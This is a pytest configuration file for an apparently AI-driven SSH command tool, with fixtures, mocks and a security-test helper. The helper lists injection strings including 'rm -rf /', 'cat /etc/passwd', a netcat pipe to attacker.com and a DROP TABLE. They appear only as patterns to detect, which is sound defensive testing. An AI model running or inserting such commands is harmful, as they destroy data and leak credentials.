"""Shared test fixtures and configuration."""

import os
import tempfile
import shutil
from pathlib import Path
from typing import Generator, Dict, Any
import pytest
from unittest.mock import Mock, patch
import factory
from faker import Faker

# Set test environment variables
os.environ['TESTING'] = 'true'
os.environ['DATABASE_URL'] = 'sqlite:///test.db'

from src.models import MachineConfig, CommandResult, UserIntent, ConversationContext
from src.machine_manager import MachineManager
from src.ssh_manager import SSHManager
from src.command_interpreter import CommandInterpreter
from src.ai_agent import AIAgent

fake = Faker(['zh_TW', 'en_US'])


# Factory classes for test data generation
class MachineConfigFactory(factory.Factory):
    """Factory for creating MachineConfig instances."""
    
    class Meta:
        model = MachineConfig
    
    id = factory.LazyFunction(lambda: fake.uuid4())
    name = factory.LazyFunction(lambda: fake.company())
    host = factory.LazyFunction(lambda: fake.ipv4())
    port = 22
    username = factory.LazyFunction(lambda: fake.user_name())
    password = factory.LazyFunction(lambda: fake.password())
    description = factory.LazyFunction(lambda: fake.text(max_nb_chars=100))


class CommandResultFactory(factory.Factory):
    """Factory for creating CommandResult instances."""
    
    class Meta:
        model = CommandResult
    
    command = factory.LazyFunction(lambda: fake.sentence())
    stdout = factory.LazyFunction(lambda: fake.text())
    stderr = ""
    exit_code = 0
    execution_time = factory.LazyFunction(lambda: fake.pyfloat(min_value=0.01, max_value=5.0))


class UserIntentFactory(factory.Factory):
    """Factory for creating UserIntent instances."""
    
    class Meta:
        model = UserIntent
    
    action = factory.Iterator(['check_os_version', 'install_cuda', 'check_devices', 'check_network'])
    parameters = factory.LazyFunction(lambda: {"commands": [fake.sentence()]})
    confidence = factory.LazyFunction(lambda: fake.pyfloat(min_value=0.5, max_value=1.0))
    original_text = factory.LazyFunction(lambda: fake.sentence())


# Pytest fixtures
@pytest.fixture(scope="session")
def temp_dir() -> Generator[str, None, None]:
    """Create a temporary directory for the test session."""
    temp_path = tempfile.mkdtemp(prefix="ssh_ai_test_")
    yield temp_path
    try:
        shutil.rmtree(temp_path)
    except OSError as e:
        print(f"Error cleaning up temporary directory {temp_path}: {e}")


@pytest.fixture
def isolated_temp_dir() -> Generator[str, None, None]:
    """Create an isolated temporary directory for each test."""
    temp_path = tempfile.mkdtemp(prefix="ssh_ai_isolated_")
    yield temp_path
    try:
        shutil.rmtree(temp_path)
    except OSError as e:
        print(f"Error cleaning up isolated temporary directory {temp_path}: {e}")


@pytest.fixture
def isolated_temp_dir() -> Generator[str, None, None]:
    """Create an isolated temporary directory for each test."""
    temp_path = tempfile.mkdtemp(prefix="ssh_ai_isolated_")
    yield temp_path
    shutil.rmtree(temp_path, ignore_errors=True)


@pytest.fixture
def sample_machine() -> MachineConfig:
    """Create a sample machine configuration."""
    return MachineConfigFactory()


@pytest.fixture
def sample_machines() -> list[MachineConfig]:
    """Create multiple sample machine configurations."""
    return MachineConfigFactory.create_batch(3)


@pytest.fixture
def sample_command_result() -> CommandResult:
    """Create a sample command result."""
    return CommandResultFactory()


@pytest.fixture
def successful_command_result() -> CommandResult:
    """Create a successful command result."""
    return CommandResultFactory(
        command="echo 'success'",
        stdout="success\n",
        stderr="",
        exit_code=0,
        execution_time=0.1
    )


@pytest.fixture
def failed_command_result() -> CommandResult:
    """Create a failed command result."""
    return CommandResultFactory(
        command="invalid_command",
        stdout="",
        stderr="command not found\n",
        exit_code=127,
        execution_time=0.05
    )


@pytest.fixture
def sample_user_intent() -> UserIntent:
    """Create a sample user intent."""
    return UserIntentFactory()


@pytest.fixture
def machine_manager(isolated_temp_dir: str) -> MachineManager:
    """Create a machine manager with isolated storage."""
    return MachineManager(config_dir=isolated_temp_dir)


@pytest.fixture
def ssh_manager() -> SSHManager:
    """Create an SSH manager instance."""
    return SSHManager()


@pytest.fixture
def command_interpreter() -> CommandInterpreter:
    """Create a command interpreter instance."""
    return CommandInterpreter()


@pytest.fixture
def ai_agent(isolated_temp_dir: str) -> AIAgent:
    """Create an AI agent with isolated storage."""
    agent = AIAgent(config_dir=isolated_temp_dir)
    return agent


@pytest.fixture
def mock_ssh_client():
    """Create a mock SSH client for testing."""
    with patch('src.ssh_manager.paramiko.SSHClient') as mock_client:
        # Configure default behavior
        mock_instance = Mock()
        mock_client.return_value = mock_instance
        
        # Mock successful connection by default
        mock_instance.connect.return_value = None
        
        # Mock successful command execution by default
        mock_stdin = Mock()
        mock_stdout = Mock()
        mock_stderr = Mock()
        
        mock_stdout.read.return_value = b"test output\n"
        mock_stderr.read.return_value = b""
        mock_stdout.channel = Mock()
        mock_stdout.channel.recv_exit_status.return_value = 0
        
        mock_instance.exec_command.return_value = (mock_stdin, mock_stdout, mock_stderr)
        
        yield mock_instance


@pytest.fixture
def mock_database():
    """Create a mock database for testing."""
    with patch('src.database.init_database') as mock_init:
        mock_init.return_value = None
        yield mock_init


@pytest.fixture
def test_session_data() -> Dict[str, Any]:
    """Create test session data."""
    return {
        "session_id": fake.uuid4(),
        "selected_machine": None,
        "conversation_history": [],
        "created_at": fake.date_time(),
        "last_activity": fake.date_time()
    }


@pytest.fixture
def chinese_commands() -> list[str]:
    """Sample Chinese commands for testing."""
    return [
        "幫我查看這台作業系統版本",
        "幫我安裝CUDA",
        "幫我檢查當前裝置有哪些設備",
        "查看系統狀態",
        "檢查網路連線",
        "安裝 Docker",
        "查看 GPU 資訊",
        "檢查磁碟空間",
        "查看記憶體使用量",
        "重新啟動服務"
    ]


@pytest.fixture
def english_commands() -> list[str]:
    """Sample English commands for testing."""
    return [
        "check os version",
        "install cuda",
        "check devices",
        "show system status",
        "check network connection",
        "install docker",
        "show gpu info",
        "check disk space",
        "show memory usage",
        "restart service"
    ]


# Test markers configuration
def pytest_configure(config):
    """Configure pytest markers."""
    config.addinivalue_line(
        "markers", "unit: Unit tests"
    )
    config.addinivalue_line(
        "markers", "integration: Integration tests"
    )
    config.addinivalue_line(
        "markers", "performance: Performance tests"
    )
    config.addinivalue_line(
        "markers", "security: Security tests"
    )
    config.addinivalue_line(
        "markers", "slow: Slow running tests"
    )
    config.addinivalue_line(
        "markers", "ssh: Tests requiring SSH connections"
    )
    config.addinivalue_line(
        "markers", "database: Tests requiring database"
    )
    config.addinivalue_line(
        "markers", "web: Web application tests"
    )
    config.addinivalue_line(
        "markers", "docker: Docker-related tests"
    )


# Test collection hooks
def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers automatically."""
    for item in items:
        # Add unit marker to all tests by default
        if not any(marker.name in ['integration', 'performance', 'security', 'slow'] 
                  for marker in item.iter_markers()):
            item.add_marker(pytest.mark.unit)
        
        # Add slow marker to tests that might be slow
        if any(keyword in item.name.lower() 
               for keyword in ['connection', 'ssh', 'network', 'database', 'long_running', 'time_consuming', 'heavy_computation']):
            item.add_marker(pytest.mark.slow)
        
        # Add ssh marker to SSH-related tests
        if any(keyword in item.name.lower() 
               for keyword in ['ssh', 'connection', 'execute_command', 'remote_execution', 'secure_shell']):
            item.add_marker(pytest.mark.ssh)
        
        # Add database marker to database-related tests
        if any(keyword in item.name.lower() 
               for keyword in ['database', 'db', 'storage', 'persistence', 'sql', 'nosql', 'orm']):
            item.add_marker(pytest.mark.database)
        
        # Add web marker to web-related tests
        if any(keyword in item.name.lower() 
               for keyword in ['web', 'api', 'http', 'websocket', 'fastapi']):
            item.add_marker(pytest.mark.web)


# Cleanup hooks
@pytest.fixture(autouse=True)
def cleanup_test_files():
    """Automatically cleanup test files after each test."""
    yield
    
    # Clean up any test database files
    test_db_files = Path('.').glob('test*.db')
    for db_file in test_db_files:
        try:
            db_file.unlink()
        except (OSError, PermissionError) as e:
            import logging
            logging.warning(f"Failed to delete test database file {db_file}: {e}")
    
    # Clean up coverage files if they exist
    coverage_files = ['.coverage', 'coverage.xml']
    for coverage_file in coverage_files:
        try:
            Path(coverage_file).unlink()
        except (OSError, FileNotFoundError) as e:
            import logging
            logging.warning(f"Failed to delete coverage file {coverage_file}: {e}")


# Performance testing utilities


# Performance testing utilities
@pytest.fixture
def performance_monitor():
    """Monitor performance metrics during tests."""
    import time
    import psutil
    import threading
    
    class PerformanceMonitor:
        def __init__(self):
            self.start_time = None
            self.end_time = None
            self.peak_memory = 0
            self.monitoring = False
            self.monitor_thread = None
        
        def start(self):
            self.start_time = time.time()
            self.monitoring = True
            self.monitor_thread = threading.Thread(target=self._monitor_memory)
            self.monitor_thread.daemon = True
            self.monitor_thread.start()
        
        def stop(self):
            self.end_time = time.time()
            self.monitoring = False
            if self.monitor_thread:
                self.monitor_thread.join(timeout=1.0)
        
        def _monitor_memory(self):
            process = psutil.Process()
            while self.monitoring:
                try:
                    memory_mb = process.memory_info().rss / 1024 / 1024
                    self.peak_memory = max(self.peak_memory, memory_mb)
                    time.sleep(0.1)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    break
        
        @property
        def execution_time(self):
            if self.start_time and self.end_time:
                return self.end_time - self.start_time
            return None
        
        def get_report(self):
            return {
                'execution_time': self.execution_time,
                'peak_memory_mb': self.peak_memory
            }
    
    return PerformanceMonitor()


# Security testing utilities
@pytest.fixture
def security_tester():
    """Utilities for security testing."""
    
    class SecurityTester:
        @staticmethod
        def is_password_encrypted(password_data: str) -> bool:
            """Check if password appears to be encrypted."""
            # TODO: Implement proper encryption detection logic
            # This could involve checking for base64 patterns, common hash formats,
            # or performing entropy analysis on the password data
            return False
        
        @staticmethod
        def check_file_permissions(file_path: Path) -> bool:
            """Check if file has secure permissions (600)."""
            if not file_path.exists():
                return False
            
            stat = file_path.stat()
            mode = stat.st_mode & 0o777
            return mode == 0o600
        
        @staticmethod
        def simulate_injection_attack(input_string: str) -> str:
            """Simulate basic injection attack patterns."""
            injection_patterns = [
                "; rm -rf /",
                "&& cat /etc/passwd",
                "| nc attacker.com 4444",
                "`whoami`",
                "$(id)",
                "'; DROP TABLE machines; --"
            ]
            
            for pattern in injection_patterns:
                if pattern in input_string:
                    return pattern
            
            return None
    
    return SecurityTester()